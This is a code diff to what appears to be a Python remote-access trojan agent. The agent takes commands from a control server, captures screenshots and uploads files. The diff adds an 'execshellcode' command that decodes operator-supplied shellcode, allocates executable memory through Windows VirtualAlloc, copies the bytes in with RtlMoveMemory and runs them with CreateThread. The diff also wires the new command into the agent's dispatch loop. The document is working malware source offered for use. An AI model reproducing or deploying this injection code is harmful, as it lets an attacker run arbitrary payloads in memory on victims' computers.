@@ -20,6 +20,7 @@ if os.name == 'nt':
     from PIL import ImageGrab
 else:
     import pyscreenshot as ImageGrab
+import ctypes
 
 import config
 
@@ -273,6 +274,29 @@ class Agent(object):
         screenshot.save(screenshot_file)
         self.upload(screenshot_file)
 
+    @threaded
+    def execshellcode(self, shellcode_str):
+        """ Executes given shellcode string in memory """
+        shellcode = shellcode_str.replace('\\x', '')
+        shellcode = shellcode.decode("hex")
+        shellcode = bytearray(shellcode)
+        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                                  ctypes.c_int(len(shellcode)),
+                                                  ctypes.c_int(0x3000),
+                                                  ctypes.c_int(0x40))
+        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
+                                             buf,
+                                             ctypes.c_int(len(shellcode)))
+        ctypes.windll.kernel32.CreateThread(
+             ctypes.c_int(0),
+             ctypes.c_int(0),
+             ctypes.c_int(ptr),
+             ctypes.c_int(0),
+             ctypes.c_int(0),
+             ctypes.pointer(ctypes.c_int(0)))
+        self.send_output("[+] Shellcode executed.")
+
     def help(self):
         """ Displays the help """
         self.send_output(config.HELP)
@@ -338,6 +362,11 @@ class Agent(object):
                                 self.python(" ".join(args))
                         elif command == 'screenshot':
                             self.screenshot()
+                        elif command == 'execshellcode':
+                            if not args:
+                                self.send_output('usage: execshellcode <shellcode>')
+                            else:
+                                self.execshellcode(args[0])
                         elif command == 'help':
                             self.help()
                         else:
@@ -364,9 +393,11 @@ class Agent(object):
                     self.exit()
                 time.sleep(config.HELLO_INTERVAL)
 
+
 def main():
     agent = Agent()
     agent.run()
+
 
 if __name__ == "__main__":
     main()
